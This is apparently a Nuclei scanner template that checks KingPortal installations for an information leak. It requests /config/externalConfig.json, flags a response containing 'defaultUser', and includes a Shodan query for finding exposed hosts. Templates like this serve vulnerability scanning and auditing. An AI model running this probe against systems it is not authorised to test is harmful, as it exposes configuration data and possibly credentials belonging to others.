id: KingPortal_Information_leakage

info:
  name: KingPortal_Information_leakage
  author: HK
  severity: high
  description: KingPortal Development System Information leakage
  metadata:
    max-request: 1
    shodan-query: body="/public/javascripts/Common/Util/km_util.js"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /config/externalConfig.json HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - defaultUser